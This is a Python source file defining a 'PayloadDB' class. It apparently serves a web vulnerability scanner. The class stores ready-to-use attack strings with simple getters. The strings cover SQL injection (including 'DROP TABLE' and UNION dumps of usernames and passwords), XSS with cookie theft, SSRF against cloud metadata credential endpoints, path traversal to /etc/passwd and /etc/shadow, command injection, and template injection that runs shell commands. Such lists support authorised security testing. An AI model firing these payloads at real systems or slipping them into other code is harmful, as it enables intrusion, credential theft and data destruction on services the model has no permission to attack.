class PayloadDB:
    """Provides a comprehensive database of payloads for various attack types."""
    
    # ── SQL Injection Payloads ─────────────────────────────────────
    SQLI_PAYLOADS = [
        # Basic detection
        "'",
        "\"",
        "' OR '1'='1",
        "\" OR \"1\"=\"1",
        "' OR 1=1--",
        "' OR 1=1#",
        "' OR 1=1/*",
        "admin' --",
        "admin'/*",
        "') OR ('1'='1",
        # UNION-based
        "' UNION SELECT NULL--",
        "' UNION SELECT NULL,NULL--",
        "' UNION SELECT NULL,NULL,NULL--",
        "' UNION ALL SELECT 1,2,3--",
        "' UNION SELECT username,password FROM users--",
        # Error-based
        "' AND 1=CONVERT(int,(SELECT @@version))--",
        "' AND extractvalue(1,concat(0x7e,version()))--",
        "' AND updatexml(1,concat(0x7e,version()),1)--",
        # Time-based blind
        "1; WAITFOR DELAY '0:0:5'--",
        "' OR SLEEP(5)--",
        "1' AND (SELECT SLEEP(5))--",
        "'; SELECT pg_sleep(5)--",
        # Boolean-based blind
        "' AND 1=1--",
        "' AND 1=2--",
        "' AND SUBSTRING(version(),1,1)='5'--",
        # Stacked queries
        "'; DROP TABLE users--",
        "'; INSERT INTO users VALUES('hacked','hacked')--",
        # Bypass techniques
        "'%20OR%20'1'='1",
        "'/**/OR/**/1=1--",
        "' /*!50000OR*/ 1=1--",
    ]
    
    # ── XSS Payloads ──────────────────────────────────────────────
    XSS_PAYLOADS = [
        # Basic
        "<script>alert(1)</script>",
        "\"><script>alert(1)</script>",
        "'><script>alert(1)</script>",
        "<script>alert(document.cookie)</script>",
        # Event handlers
        "<img src=x onerror=alert(1)>",
        "<svg onload=alert(1)>",
        "<body onload=alert(1)>",
        "<input onfocus=alert(1) autofocus>",
        "<marquee onstart=alert(1)>",
        "<details open ontoggle=alert(1)>",
        "<video><source onerror=alert(1)>",
        # Attribute injection
        "\" autofocus onfocus=alert(1) x=\"",
        "javascript:alert(1)",
        "'-alert(1)-'",
        # Encoding bypasses
        "<script>alert(String.fromCharCode(88,83,83))</script>",
        "<img src=x onerror=&#97;&#108;&#101;&#114;&#116;(1)>",
        "\\x3cscript\\x3ealert(1)\\x3c/script\\x3e",
        # SVG-based
        "<svg/onload=alert(1)>",
        "<svg><desc><![CDATA[</desc><script>alert(1)</script>]]></svg>",
        # Polyglot
        "jaVasCript:/*-/*`/*\\`/*'/*\"/**/(/* */oNcliCk=alert() )//%0D%0A%0d%0a//</stYle/</titLe/</teXtarEa/</scRipt/--!>\\x3csVg/<sVg/oNloAd=alert()//>\\x3e",
        # DOM-based
        "#<img src=/ onerror=alert(1)>",
        "javascript:alert(document.domain)",
    ]
    
    # ── SSRF Payloads ─────────────────────────────────────────────
    SSRF_PAYLOADS = [
        # Localhost variants
        "http://127.0.0.1",
        "http://localhost",
        "http://0.0.0.0",
        "http://[::1]",
        "http://[::]:80/",
        "http://0177.0.0.1",  # Octal
        "http://2130706433",  # Decimal
        "http://0x7f000001",  # Hex
        # Cloud metadata endpoints
        "http://169.254.169.254/latest/meta-data/",  # AWS
        "http://169.254.169.254/latest/meta-data/iam/security-credentials/",
        "http://metadata.google.internal/computeMetadata/v1/",  # GCP
        "http://169.254.169.254/metadata/instance?api-version=2021-02-01",  # Azure
        # Internal services
        "http://127.0.0.1:8080",
        "http://127.0.0.1:3306",
        "http://127.0.0.1:6379",
        "http://127.0.0.1:27017",
        # File protocol
        "file:///etc/passwd",
        "file:///c:/windows/win.ini",
        # DNS rebinding
        "http://spoofed.burpcollaborator.net",
        # URL schema bypass
        "http://127.1",
        "http://127.0.0.1.nip.io",
    ]
    
    # ── Path Traversal Payloads ───────────────────────────────────
    PATH_TRAVERSAL_PAYLOADS = [
        # Linux
        "../../../etc/passwd",
        "../../../../etc/passwd",
        "../../../../../etc/shadow",
        "../../../etc/hosts",
        # Windows
        "..\\..\\..\\windows\\win.ini",
        "..\\..\\..\\windows\\system32\\drivers\\etc\\hosts",
        # Encoding bypass
        "....//....//....//etc/passwd",
        "%2e%2e%2f%2e%2e%2f%2e%2e%2fetc%2fpasswd",
        "..%252f..%252f..%252fetc/passwd",  # Double URL encode
        "%252e%252e%252f%252e%252e%252fetc/passwd",
        "..%c0%af..%c0%af..%c0%afetc/passwd",  # UTF-8 overlong
        # Null byte (legacy)
        "../../../etc/passwd%00.jpg",
        "../../../etc/passwd%00.png",
        # Absolute path
        "/etc/passwd",
        "C:\\windows\\win.ini",
    ]

    # ── Command Injection Payloads ────────────────────────────────
    CMDI_PAYLOADS = [
        "; id",
        "| id",
        "|| id",
        "& id",
        "&& id",
        "`id`",
        "$(id)",
        "; whoami",
        "| whoami",
        "; cat /etc/passwd",
        "| type C:\\windows\\win.ini",
        "\nid\n",
        ";sleep 5",
        "| sleep 5",
    ]

    # ── SSTI Payloads ─────────────────────────────────────────────
    SSTI_PAYLOADS = [
        "{{7*7}}",
        "${7*7}",
        "#{7*7}",
        "<%= 7*7 %>",
        "{{config}}",
        "{{self.__class__.__mro__}}",
        "${T(java.lang.Runtime).getRuntime().exec('id')}",
        "{{request.application.__globals__.__builtins__.__import__('os').popen('id').read()}}",
    ]

    @classmethod
    def get_sqli_payloads(cls, limit: int = 10):
        return cls.SQLI_PAYLOADS[:limit]
        
    @classmethod
    def get_xss_payloads(cls, limit: int = 10):
        return cls.XSS_PAYLOADS[:limit]

    @classmethod
    def get_ssrf_payloads(cls, limit: int = 10):
        return cls.SSRF_PAYLOADS[:limit]

    @classmethod
    def get_path_traversal_payloads(cls, limit: int = 10):
        return cls.PATH_TRAVERSAL_PAYLOADS[:limit]

    @classmethod
    def get_cmdi_payloads(cls, limit: int = 10):
        return cls.CMDI_PAYLOADS[:limit]

    @classmethod
    def get_ssti_payloads(cls, limit: int = 10):
        return cls.SSTI_PAYLOADS[:limit]
